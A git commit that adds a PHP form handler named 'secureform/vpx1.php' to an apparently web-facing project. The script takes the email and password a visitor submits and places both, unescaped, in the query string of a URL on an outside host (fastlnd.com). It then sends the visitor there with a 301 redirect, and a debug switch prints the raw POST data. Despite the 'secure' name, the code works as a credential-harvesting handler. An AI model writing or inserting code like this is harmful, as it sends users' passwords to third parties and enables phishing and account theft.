4e7b5fde822cf9c9b63e19b40a1fc3a38afb2caa
games24online <137506795+games24online@users.noreply.github.com>
2023-07-06 14:40:28 +0300

    Add files via upload

---
+++ secureform/vpx1.php
@@ -0,0 +1,22 @@
+
+
+</head><?php
+header('Access-Control-Allow-Origin: *');
+include('./ga.php');
+include('./inboxsuite.php');
+include('./postback.php');
+include('./registration.php');
+$redirect = "https://fastlnd.com/ep.php/JK-prmagms:76778/69281:US25may.".$_GET['clickid']."?EX1=".$_POST['email']."&EX2=".$_POST['password'];
+if(isset($_GET['debug']) && isset($_GET['print'])) {
+	var_dump($_POST);
+	echo '<br/><br/>';
+	echo $redirect;
+} 
+else if(isset($_GET['getlink'])) {
+	echo $redirect;
+} else {
+	header("HTTP/1.1 301 Moved Permanently");
+	header("Location: ".$redirect);
+}
+exit();
+?>
